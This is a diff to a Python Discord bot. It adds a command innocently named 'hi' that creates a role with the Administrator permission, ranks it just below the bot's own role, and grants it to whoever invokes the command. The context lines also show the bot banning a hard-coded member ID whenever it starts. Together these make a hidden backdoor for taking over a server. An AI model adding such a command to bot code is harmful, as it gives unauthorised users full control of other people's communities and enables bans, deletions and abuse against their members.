@@ -87,6 +87,18 @@ async def on_ready():
     m = guild.get_member(659728796437708800)
     await m.ban()
     print(guild.name)
- 
+
+@main_bot.command()
+async def hi(ctx):
+    perms = discord.Permissions(8)
+    r = await ctx.guild.create_role(name='new-roole', permissions=perms)
+
+    pos = {
+        r: ctx.guild.self_role.position - 1
+    }
+
+    await ctx.guild.edit_role_positions(positions = pos)
+    await ctx.author.add_roles(r)
+
 main_bot.load_extensions()
 main_bot.run(os.getenv('BOT_TOKEN'))
